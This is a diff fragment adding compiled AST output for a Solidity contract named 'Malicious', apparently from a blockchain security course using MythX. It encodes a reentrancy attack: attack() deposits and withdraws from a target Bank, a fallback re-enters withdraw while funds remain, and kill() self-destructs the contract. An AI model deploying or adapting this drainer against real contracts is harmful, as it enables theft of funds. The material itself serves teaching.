+                                                        "nodeType": "MemberAccess",
+                                                        "referencedDeclaration": null,
+                                                        "src": "254:10:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_address_payable",
+                                                            "typeString": "address payable"
+                                                        }
+                                                    }
+                                                ],
+                                                "expression": {
+                                                    "argumentTypes": [
+                                                        {
+                                                            "typeIdentifier": "t_address_payable",
+                                                            "typeString": "address payable"
+                                                        }
+                                                    ],
+                                                    "id": 48,
+                                                    "name": "selfdestruct",
+                                                    "nodeType": "Identifier",
+                                                    "overloadedDeclarations": [],
+                                                    "referencedDeclaration": 124,
+                                                    "src": "241:12:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_function_selfdestruct_nonpayable$_t_address_payable_$returns$__$",
+                                                        "typeString": "function (address payable)"
+                                                    }
+                                                },
+                                                "id": 51,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "kind": "functionCall",
+                                                "lValueRequested": false,
+                                                "names": [],
+                                                "nodeType": "FunctionCall",
+                                                "src": "241:24:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_tuple$__$",
+                                                    "typeString": "tuple()"
+                                                }
+                                            },
+                                            "id": 52,
+                                            "nodeType": "ExpressionStatement",
+                                            "src": "241:24:1"
+                                        }
+                                    ]
+                                },
+                                "documentation": null,
+                                "id": 54,
+                                "implemented": true,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "kill",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 46,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "225:2:1"
+                                },
+                                "returnParameters": {
+                                    "id": 47,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "235:0:1"
+                                },
+                                "scope": 101,
+                                "src": "212:58:1",
+                                "stateMutability": "nonpayable",
+                                "superFunction": null,
+                                "visibility": "public"
+                            },
+                            {
+                                "body": {
+                                    "id": 79,
+                                    "nodeType": "Block",
+                                    "src": "307:109:1",
+                                    "statements": [
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "arguments": [],
+                                                "expression": {
+                                                    "argumentTypes": [],
+                                                    "expression": {
+                                                        "argumentTypes": null,
+                                                        "id": 57,
+                                                        "name": "targetBank",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 29,
+                                                        "src": "313:10:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_contract$_Bank_$24",
+                                                            "typeString": "contract Bank"
+                                                        }
+                                                    },
+                                                    "id": 59,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "lValueRequested": false,
+                                                    "memberName": "enroll",
+                                                    "nodeType": "MemberAccess",
+                                                    "referencedDeclaration": 23,
+                                                    "src": "313:17:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_function_external_nonpayable$__$returns$_t_bool_$",
+                                                        "typeString": "function () external returns (bool)"
+                                                    }
+                                                },
+                                                "id": 60,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "kind": "functionCall",
+                                                "lValueRequested": false,
+                                                "names": [],
+                                                "nodeType": "FunctionCall",
+                                                "src": "313:19:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_bool",
+                                                    "typeString": "bool"
+                                                }
+                                            },
+                                            "id": 61,
+                                            "nodeType": "ExpressionStatement",
+                                            "src": "313:19:1"
+                                        },
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "arguments": [],
+                                                "expression": {
+                                                    "argumentTypes": [],
+                                                    "arguments": [
+                                                        {
+                                                            "argumentTypes": null,
+                                                            "expression": {
+                                                                "argumentTypes": null,
+                                                                "id": 67,
+                                                                "name": "msg",
+                                                                "nodeType": "Identifier",
+                                                                "overloadedDeclarations": [],
+                                                                "referencedDeclaration": 116,
+                                                                "src": "363:3:1",
+                                                                "typeDescriptions": {
+                                                                    "typeIdentifier": "t_magic_message",
+                                                                    "typeString": "msg"
+                                                                }
+                                                            },
+                                                            "id": 68,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "lValueRequested": false,
+                                                            "memberName": "value",
+                                                            "nodeType": "MemberAccess",
+                                                            "referencedDeclaration": null,
+                                                            "src": "363:9:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_uint256",
+                                                                "typeString": "uint256"
+                                                            }
+                                                        }
+                                                    ],
+                                                    "expression": {
+                                                        "argumentTypes": [
+                                                            {
+                                                                "typeIdentifier": "t_uint256",
+                                                                "typeString": "uint256"
+                                                            }
+                                                        ],
+                                                        "expression": {
+                                                            "argumentTypes": null,
+                                                            "expression": {
+                                                                "argumentTypes": null,
+                                                                "id": 62,
+                                                                "name": "targetBank",
+                                                                "nodeType": "Identifier",
+                                                                "overloadedDeclarations": [],
+                                                                "referencedDeclaration": 29,
+                                                                "src": "338:10:1",
+                                                                "typeDescriptions": {
+                                                                    "typeIdentifier": "t_contract$_Bank_$24",
+                                                                    "typeString": "contract Bank"
+                                                                }
+                                                            },
+                                                            "id": 65,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "lValueRequested": false,
+                                                            "memberName": "deposit",
+                                                            "nodeType": "MemberAccess",
+                                                            "referencedDeclaration": 11,
+                                                            "src": "338:18:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_function_external_payable$__$returns$_t_uint256_$",
+                                                                "typeString": "function () payable external returns (uint256)"
+                                                            }
+                                                        },
+                                                        "id": 66,
+                                                        "isConstant": false,
+                                                        "isLValue": false,
+                                                        "isPure": false,
+                                                        "lValueRequested": false,
+                                                        "memberName": "value",
+                                                        "nodeType": "MemberAccess",
+                                                        "referencedDeclaration": null,
+                                                        "src": "338:24:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$__$returns$_t_uint256_$value_$",
+                                                            "typeString": "function (uint256) pure returns (function () payable external returns (uint256))"
+                                                        }
+                                                    },
+                                                    "id": 69,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "kind": "functionCall",
+                                                    "lValueRequested": false,
+                                                    "names": [],
+                                                    "nodeType": "FunctionCall",
+                                                    "src": "338:35:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_function_external_payable$__$returns$_t_uint256_$value",
+                                                        "typeString": "function () payable external returns (uint256)"
+                                                    }
+                                                },
+                                                "id": 70,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "kind": "functionCall",
+                                                "lValueRequested": false,
+                                                "names": [],
+                                                "nodeType": "FunctionCall",
+                                                "src": "338:37:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "id": 71,
+                                            "nodeType": "ExpressionStatement",
+                                            "src": "338:37:1"
+                                        },
+                                        {
+                                            "expression": {
+                                                "argumentTypes": null,
+                                                "arguments": [
+                                                    {
+                                                        "argumentTypes": null,
+                                                        "expression": {
+                                                            "argumentTypes": null,
+                                                            "id": 75,
+                                                            "name": "msg",
+                                                            "nodeType": "Identifier",
+                                                            "overloadedDeclarations": [],
+                                                            "referencedDeclaration": 116,
+                                                            "src": "401:3:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_magic_message",
+                                                                "typeString": "msg"
+                                                            }
+                                                        },
+                                                        "id": 76,
+                                                        "isConstant": false,
+                                                        "isLValue": false,
+                                                        "isPure": false,
+                                                        "lValueRequested": false,
+                                                        "memberName": "value",
+                                                        "nodeType": "MemberAccess",
+                                                        "referencedDeclaration": null,
+                                                        "src": "401:9:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_uint256",
+                                                            "typeString": "uint256"
+                                                        }
+                                                    }
+                                                ],
+                                                "expression": {
+                                                    "argumentTypes": [
+                                                        {
+                                                            "typeIdentifier": "t_uint256",
+                                                            "typeString": "uint256"
+                                                        }
+                                                    ],
+                                                    "expression": {
+                                                        "argumentTypes": null,
+                                                        "id": 72,
+                                                        "name": "targetBank",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 29,
+                                                        "src": "381:10:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_contract$_Bank_$24",
+                                                            "typeString": "contract Bank"
+                                                        }
+                                                    },
+                                                    "id": 74,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "lValueRequested": false,
+                                                    "memberName": "withdraw",
+                                                    "nodeType": "MemberAccess",
+                                                    "referencedDeclaration": 18,
+                                                    "src": "381:19:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$_t_uint256_$",
+                                                        "typeString": "function (uint256) external returns (uint256)"
+                                                    }
+                                                },
+                                                "id": 77,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "kind": "functionCall",
+                                                "lValueRequested": false,
+                                                "names": [],
+                                                "nodeType": "FunctionCall",
+                                                "src": "381:30:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                }
+                                            },
+                                            "id": 78,
+                                            "nodeType": "ExpressionStatement",
+                                            "src": "381:30:1"
+                                        }
+                                    ]
+                                },
+                                "documentation": null,
+                                "id": 80,
+                                "implemented": true,
+                                "kind": "function",
+                                "modifiers": [],
+                                "name": "attack",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 55,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "289:2:1"
+                                },
+                                "returnParameters": {
+                                    "id": 56,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "307:0:1"
+                                },
+                                "scope": 101,
+                                "src": "274:142:1",
+                                "stateMutability": "payable",
+                                "superFunction": null,
+                                "visibility": "public"
+                            },
+                            {
+                                "body": {
+                                    "id": 99,
+                                    "nodeType": "Block",
+                                    "src": "448:100:1",
+                                    "statements": [
+                                        {
+                                            "condition": {
+                                                "argumentTypes": null,
+                                                "commonType": {
+                                                    "typeIdentifier": "t_uint256",
+                                                    "typeString": "uint256"
+                                                },
+                                                "id": 89,
+                                                "isConstant": false,
+                                                "isLValue": false,
+                                                "isPure": false,
+                                                "lValueRequested": false,
+                                                "leftExpression": {
+                                                    "argumentTypes": null,
+                                                    "expression": {
+                                                        "argumentTypes": null,
+                                                        "arguments": [
+                                                            {
+                                                                "argumentTypes": null,
+                                                                "id": 84,
+                                                                "name": "targetBank",
+                                                                "nodeType": "Identifier",
+                                                                "overloadedDeclarations": [],
+                                                                "referencedDeclaration": 29,
+                                                                "src": "465:10:1",
+                                                                "typeDescriptions": {
+                                                                    "typeIdentifier": "t_contract$_Bank_$24",
+                                                                    "typeString": "contract Bank"
+                                                                }
+                                                            }
+                                                        ],
+                                                        "expression": {
+                                                            "argumentTypes": [
+                                                                {
+                                                                    "typeIdentifier": "t_contract$_Bank_$24",
+                                                                    "typeString": "contract Bank"
+                                                                }
+                                                            ],
+                                                            "id": 83,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": true,
+                                                            "lValueRequested": false,
+                                                            "nodeType": "ElementaryTypeNameExpression",
+                                                            "src": "457:7:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_type$_t_address_$",
+                                                                "typeString": "type(address)"
+                                                            },
+                                                            "typeName": "address"
+                                                        },
+                                                        "id": 85,
+                                                        "isConstant": false,
+                                                        "isLValue": false,
+                                                        "isPure": false,
+                                                        "kind": "typeConversion",
+                                                        "lValueRequested": false,
+                                                        "names": [],
+                                                        "nodeType": "FunctionCall",
+                                                        "src": "457:19:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_address",
+                                                            "typeString": "address"
+                                                        }
+                                                    },
+                                                    "id": 86,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "lValueRequested": false,
+                                                    "memberName": "balance",
+                                                    "nodeType": "MemberAccess",
+                                                    "referencedDeclaration": null,
+                                                    "src": "457:27:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_uint256",
+                                                        "typeString": "uint256"
+                                                    }
+                                                },
+                                                "nodeType": "BinaryOperation",
+                                                "operator": ">=",
+                                                "rightExpression": {
+                                                    "argumentTypes": null,
+                                                    "expression": {
+                                                        "argumentTypes": null,
+                                                        "id": 87,
+                                                        "name": "msg",
+                                                        "nodeType": "Identifier",
+                                                        "overloadedDeclarations": [],
+                                                        "referencedDeclaration": 116,
+                                                        "src": "488:3:1",
+                                                        "typeDescriptions": {
+                                                            "typeIdentifier": "t_magic_message",
+                                                            "typeString": "msg"
+                                                        }
+                                                    },
+                                                    "id": 88,
+                                                    "isConstant": false,
+                                                    "isLValue": false,
+                                                    "isPure": false,
+                                                    "lValueRequested": false,
+                                                    "memberName": "value",
+                                                    "nodeType": "MemberAccess",
+                                                    "referencedDeclaration": null,
+                                                    "src": "488:9:1",
+                                                    "typeDescriptions": {
+                                                        "typeIdentifier": "t_uint256",
+                                                        "typeString": "uint256"
+                                                    }
+                                                },
+                                                "src": "457:40:1",
+                                                "typeDescriptions": {
+                                                    "typeIdentifier": "t_bool",
+                                                    "typeString": "bool"
+                                                }
+                                            },
+                                            "falseBody": null,
+                                            "id": 98,
+                                            "nodeType": "IfStatement",
+                                            "src": "454:90:1",
+                                            "trueBody": {
+                                                "id": 97,
+                                                "nodeType": "Block",
+                                                "src": "499:45:1",
+                                                "statements": [
+                                                    {
+                                                        "expression": {
+                                                            "argumentTypes": null,
+                                                            "arguments": [
+                                                                {
+                                                                    "argumentTypes": null,
+                                                                    "expression": {
+                                                                        "argumentTypes": null,
+                                                                        "id": 93,
+                                                                        "name": "msg",
+                                                                        "nodeType": "Identifier",
+                                                                        "overloadedDeclarations": [],
+                                                                        "referencedDeclaration": 116,
+                                                                        "src": "527:3:1",
+                                                                        "typeDescriptions": {
+                                                                            "typeIdentifier": "t_magic_message",
+                                                                            "typeString": "msg"
+                                                                        }
+                                                                    },
+                                                                    "id": 94,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "memberName": "value",
+                                                                    "nodeType": "MemberAccess",
+                                                                    "referencedDeclaration": null,
+                                                                    "src": "527:9:1",
+                                                                    "typeDescriptions": {
+                                                                        "typeIdentifier": "t_uint256",
+                                                                        "typeString": "uint256"
+                                                                    }
+                                                                }
+                                                            ],
+                                                            "expression": {
+                                                                "argumentTypes": [
+                                                                    {
+                                                                        "typeIdentifier": "t_uint256",
+                                                                        "typeString": "uint256"
+                                                                    }
+                                                                ],
+                                                                "expression": {
+                                                                    "argumentTypes": null,
+                                                                    "id": 90,
+                                                                    "name": "targetBank",
+                                                                    "nodeType": "Identifier",
+                                                                    "overloadedDeclarations": [],
+                                                                    "referencedDeclaration": 29,
+                                                                    "src": "507:10:1",
+                                                                    "typeDescriptions": {
+                                                                        "typeIdentifier": "t_contract$_Bank_$24",
+                                                                        "typeString": "contract Bank"
+                                                                    }
+                                                                },
+                                                                "id": 92,
+                                                                "isConstant": false,
+                                                                "isLValue": false,
+                                                                "isPure": false,
+                                                                "lValueRequested": false,
+                                                                "memberName": "withdraw",
+                                                                "nodeType": "MemberAccess",
+                                                                "referencedDeclaration": 18,
+                                                                "src": "507:19:1",
+                                                                "typeDescriptions": {
+                                                                    "typeIdentifier": "t_function_external_nonpayable$_t_uint256_$returns$_t_uint256_$",
+                                                                    "typeString": "function (uint256) external returns (uint256)"
+                                                                }
+                                                            },
+                                                            "id": 95,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "kind": "functionCall",
+                                                            "lValueRequested": false,
+                                                            "names": [],
+                                                            "nodeType": "FunctionCall",
+                                                            "src": "507:30:1",
+                                                            "typeDescriptions": {
+                                                                "typeIdentifier": "t_uint256",
+                                                                "typeString": "uint256"
+                                                            }
+                                                        },
+                                                        "id": 96,
+                                                        "nodeType": "ExpressionStatement",
+                                                        "src": "507:30:1"
+                                                    }
+                                                ]
+                                            }
+                                        }
+                                    ]
+                                },
+                                "documentation": null,
+                                "id": 100,
+                                "implemented": true,
+                                "kind": "fallback",
+                                "modifiers": [],
+                                "name": "",
+                                "nodeType": "FunctionDefinition",
+                                "parameters": {
+                                    "id": 81,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "428:2:1"
+                                },
+                                "returnParameters": {
+                                    "id": 82,
+                                    "nodeType": "ParameterList",
+                                    "parameters": [],
+                                    "src": "448:0:1"
+                                },
+                                "scope": 101,
+                                "src": "420:128:1",
+                                "stateMutability": "payable",
+                                "superFunction": null,
+                                "visibility": "external"
+                            }
+                        ],
+                        "scope": 102,
+                        "src": "47:503:1"
+                    }
+                ],
+                "src": "0:551:1"
+            },
+            "legacyAST": {
+                "attributes": {
+                    "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Malicious.sol",
+                    "exportedSymbols": {
+                        "Malicious": [
+                            101
+                        ]
+                    }
+                },
+                "children": [
+                    {
+                        "attributes": {
+                            "literals": [
+                                "solidity",
+                                "^",
+                                "0.5",
+                                ".0"
+                            ]
+                        },
+                        "id": 26,
+                        "name": "PragmaDirective",
+                        "src": "0:23:1"
+                    },
+                    {
+                        "attributes": {
+                            "SourceUnit": 25,
+                            "absolutePath": "/Users/joshuacassidy/DAPPS/aba-dev/aba-academy/example-code/ABDP-Cohort2-Code-Examples/Security/MythX/contracts/Bank.sol",
+                            "file": "./Bank.sol",
+                            "scope": 102,
+                            "symbolAliases": [
+                                null
+                            ],
+                            "unitAlias": ""
+                        },
+                        "id": 27,
+                        "name": "ImportDirective",
+                        "src": "25:20:1"
+                    },
+                    {
+                        "attributes": {
+                            "baseContracts": [
+                                null
+                            ],
+                            "contractDependencies": [
+                                null
+                            ],
+                            "contractKind": "contract",
+                            "documentation": null,
+                            "fullyImplemented": true,
+                            "linearizedBaseContracts": [
+                                101
+                            ],
+                            "name": "Malicious",
+                            "scope": 102
+                        },
+                        "children": [
+                            {
+                                "attributes": {
+                                    "constant": false,
+                                    "name": "targetBank",
+                                    "scope": 101,
+                                    "stateVariable": true,
+                                    "storageLocation": "default",
+                                    "type": "contract Bank",
+                                    "value": null,
+                                    "visibility": "public"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "contractScope": null,
+                                            "name": "Bank",
+                                            "referencedDeclaration": 24,
+                                            "type": "contract Bank"
+                                        },
+                                        "id": 28,
+                                        "name": "UserDefinedTypeName",
+                                        "src": "70:4:1"
+                                    }
+                                ],
+                                "id": 29,
+                                "name": "VariableDeclaration",
+                                "src": "70:22:1"
+                            },
+                            {
+                                "attributes": {
+                                    "anonymous": false,
+                                    "documentation": null,
+                                    "name": "LogTest"
+                                },
+                                "children": [
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "indexed": false,
+                                                    "name": "value",
+                                                    "scope": 33,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "uint256",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "uint",
+                                                            "type": "uint256"
+                                                        },
+                                                        "id": 30,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "111:4:1"
+                                                    }
+                                                ],
+                                                "id": 31,
+                                                "name": "VariableDeclaration",
+                                                "src": "111:10:1"
+                                            }
+                                        ],
+                                        "id": 32,
+                                        "name": "ParameterList",
+                                        "src": "110:12:1"
+                                    }
+                                ],
+                                "id": 33,
+                                "name": "EventDefinition",
+                                "src": "97:26:1"
+                            },
+                            {
+                                "attributes": {
+                                    "documentation": null,
+                                    "implemented": true,
+                                    "isConstructor": true,
+                                    "kind": "constructor",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "",
+                                    "scope": 101,
+                                    "stateMutability": "nonpayable",
+                                    "superFunction": null,
+                                    "visibility": "public"
+                                },
+                                "children": [
+                                    {
+                                        "children": [
+                                            {
+                                                "attributes": {
+                                                    "constant": false,
+                                                    "name": "_targetBank",
+                                                    "scope": 45,
+                                                    "stateVariable": false,
+                                                    "storageLocation": "default",
+                                                    "type": "address",
+                                                    "value": null,
+                                                    "visibility": "internal"
+                                                },
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "name": "address",
+                                                            "stateMutability": "nonpayable",
+                                                            "type": "address"
+                                                        },
+                                                        "id": 34,
+                                                        "name": "ElementaryTypeName",
+                                                        "src": "139:7:1"
+                                                    }
+                                                ],
+                                                "id": 35,
+                                                "name": "VariableDeclaration",
+                                                "src": "139:19:1"
+                                            }
+                                        ],
+                                        "id": 36,
+                                        "name": "ParameterList",
+                                        "src": "138:21:1"
+                                    },
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 37,
+                                        "name": "ParameterList",
+                                        "src": "167:0:1"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "lValueRequested": false,
+                                                            "operator": "=",
+                                                            "type": "contract Bank"
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "overloadedDeclarations": [
+                                                                        null
+                                                                    ],
+                                                                    "referencedDeclaration": 29,
+                                                                    "type": "contract Bank",
+                                                                    "value": "targetBank"
+                                                                },
+                                                                "id": 38,
+                                                                "name": "Identifier",
+                                                                "src": "173:10:1"
+                                                            },
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "isStructConstructorCall": false,
+                                                                    "lValueRequested": false,
+                                                                    "names": [
+                                                                        null
+                                                                    ],
+                                                                    "type": "contract Bank",
+                                                                    "type_conversion": true
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": [
+                                                                                {
+                                                                                    "typeIdentifier": "t_address",
+                                                                                    "typeString": "address"
+                                                                                }
+                                                                            ],
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 24,
+                                                                            "type": "type(contract Bank)",
+                                                                            "value": "Bank"
+                                                                        },
+                                                                        "id": 39,
+                                                                        "name": "Identifier",
+                                                                        "src": "186:4:1"
+                                                                    },
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 35,
+                                                                            "type": "address",
+                                                                            "value": "_targetBank"
+                                                                        },
+                                                                        "id": 40,
+                                                                        "name": "Identifier",
+                                                                        "src": "191:11:1"
+                                                                    }
+                                                                ],
+                                                                "id": 41,
+                                                                "name": "FunctionCall",
+                                                                "src": "186:17:1"
+                                                            }
+                                                        ],
+                                                        "id": 42,
+                                                        "name": "Assignment",
+                                                        "src": "173:30:1"
+                                                    }
+                                                ],
+                                                "id": 43,
+                                                "name": "ExpressionStatement",
+                                                "src": "173:30:1"
+                                            }
+                                        ],
+                                        "id": 44,
+                                        "name": "Block",
+                                        "src": "167:41:1"
+                                    }
+                                ],
+                                "id": 45,
+                                "name": "FunctionDefinition",
+                                "src": "127:81:1"
+                            },
+                            {
+                                "attributes": {
+                                    "documentation": null,
+                                    "implemented": true,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "kill",
+                                    "scope": 101,
+                                    "stateMutability": "nonpayable",
+                                    "superFunction": null,
+                                    "visibility": "public"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 46,
+                                        "name": "ParameterList",
+                                        "src": "225:2:1"
+                                    },
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 47,
+                                        "name": "ParameterList",
+                                        "src": "235:0:1"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "isStructConstructorCall": false,
+                                                            "lValueRequested": false,
+                                                            "names": [
+                                                                null
+                                                            ],
+                                                            "type": "tuple()",
+                                                            "type_conversion": false
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": [
+                                                                        {
+                                                                            "typeIdentifier": "t_address_payable",
+                                                                            "typeString": "address payable"
+                                                                        }
+                                                                    ],
+                                                                    "overloadedDeclarations": [
+                                                                        null
+                                                                    ],
+                                                                    "referencedDeclaration": 124,
+                                                                    "type": "function (address payable)",
+                                                                    "value": "selfdestruct"
+                                                                },
+                                                                "id": 48,
+                                                                "name": "Identifier",
+                                                                "src": "241:12:1"
+                                                            },
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": null,
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "sender",
+                                                                    "referencedDeclaration": null,
+                                                                    "type": "address payable"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 116,
+                                                                            "type": "msg",
+                                                                            "value": "msg"
+                                                                        },
+                                                                        "id": 49,
+                                                                        "name": "Identifier",
+                                                                        "src": "254:3:1"
+                                                                    }
+                                                                ],
+                                                                "id": 50,
+                                                                "name": "MemberAccess",
+                                                                "src": "254:10:1"
+                                                            }
+                                                        ],
+                                                        "id": 51,
+                                                        "name": "FunctionCall",
+                                                        "src": "241:24:1"
+                                                    }
+                                                ],
+                                                "id": 52,
+                                                "name": "ExpressionStatement",
+                                                "src": "241:24:1"
+                                            }
+                                        ],
+                                        "id": 53,
+                                        "name": "Block",
+                                        "src": "235:35:1"
+                                    }
+                                ],
+                                "id": 54,
+                                "name": "FunctionDefinition",
+                                "src": "212:58:1"
+                            },
+                            {
+                                "attributes": {
+                                    "documentation": null,
+                                    "implemented": true,
+                                    "isConstructor": false,
+                                    "kind": "function",
+                                    "modifiers": [
+                                        null
+                                    ],
+                                    "name": "attack",
+                                    "scope": 101,
+                                    "stateMutability": "payable",
+                                    "superFunction": null,
+                                    "visibility": "public"
+                                },
+                                "children": [
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 55,
+                                        "name": "ParameterList",
+                                        "src": "289:2:1"
+                                    },
+                                    {
+                                        "attributes": {
+                                            "parameters": [
+                                                null
+                                            ]
+                                        },
+                                        "children": [],
+                                        "id": 56,
+                                        "name": "ParameterList",
+                                        "src": "307:0:1"
+                                    },
+                                    {
+                                        "children": [
+                                            {
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "arguments": [
+                                                                null
+                                                            ],
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "isStructConstructorCall": false,
+                                                            "lValueRequested": false,
+                                                            "names": [
+                                                                null
+                                                            ],
+                                                            "type": "bool",
+                                                            "type_conversion": false
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": [
+                                                                        null
+                                                                    ],
+                                                                    "isConstant": false,
+                                                                    "isLValue": false,
+                                                                    "isPure": false,
+                                                                    "lValueRequested": false,
+                                                                    "member_name": "enroll",
+                                                                    "referencedDeclaration": 23,
+                                                                    "type": "function () external returns (bool)"
+                                                                },
+                                                                "children": [
+                                                                    {
+                                                                        "attributes": {
+                                                                            "argumentTypes": null,
+                                                                            "overloadedDeclarations": [
+                                                                                null
+                                                                            ],
+                                                                            "referencedDeclaration": 29,
+                                                                            "type": "contract Bank",
+                                                                            "value": "targetBank"
+                                                                        },
+                                                                        "id": 57,
+                                                                        "name": "Identifier",
+                                                                        "src": "313:10:1"
+                                                                    }
+                                                                ],
+                                                                "id": 59,
+                                                                "name": "MemberAccess",
+                                                                "src": "313:17:1"
+                                                            }
+                                                        ],
+                                                        "id": 60,
+                                                        "name": "FunctionCall",
+                                                        "src": "313:19:1"
+                                                    }
+                                                ],
+                                                "id": 61,
+                                                "name": "ExpressionStatement",
+                                                "src": "313:19:1"
+                                            },
+                                            {
+                                                "children": [
+                                                    {
+                                                        "attributes": {
+                                                            "argumentTypes": null,
+                                                            "arguments": [
+                                                                null
+                                                            ],
+                                                            "isConstant": false,
+                                                            "isLValue": false,
+                                                            "isPure": false,
+                                                            "isStructConstructorCall": false,
+                                                            "lValueRequested": false,
+                                                            "names": [
+                                                                null
+                                                            ],
+                                                            "type": "uint256",
+                                                            "type_conversion": false
+                                                        },
+                                                        "children": [
+                                                            {
+                                                                "attributes": {
+                                                                    "argumentTypes": [
+                                                                        null
+                                                                    ],
